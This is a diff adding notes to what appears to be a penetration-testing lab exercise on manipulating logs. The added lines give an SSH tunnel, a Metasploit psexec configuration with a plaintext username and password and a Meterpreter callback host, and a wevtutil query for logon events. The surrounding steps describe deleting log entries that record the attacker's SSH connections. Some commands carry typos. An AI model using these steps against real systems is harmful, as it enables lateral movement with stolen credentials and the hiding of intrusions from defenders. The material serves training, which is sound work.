@@ -983,6 +983,19 @@ ___
 
 ### Senario 1 - Manipulate logs
 
+* Setup  
+`ssh root@10.10.1.40 -L 11111:10.10.1.10:445 -R 34567:127.0.0.:34567`
+* Exploit  
+`windows/smb/psexec`
+`RHOST= 127.0.0.1`
+`RPORT=11111`
+`SMBUser=slor`
+`SMBPass=CTEPasswd1976`
+`LHOST=10.10.1.40`
+`LPORT=34567`
+* Meterpreter  
+`multicommand cl "wevtutil qe Securithy /rd:true /f:text /q\"Event[System[(EventID=4624)]]""`
+
 1. Log in to the jump point to identify and remove any log entries relating specifically to SSH connections the attack machine makes.
 2. Before opening any log files, run the file command against the log file to determine if it is ASCII text and therefore human readable.
 3. Log in to the Kali machine and SSH into the jump point machine.
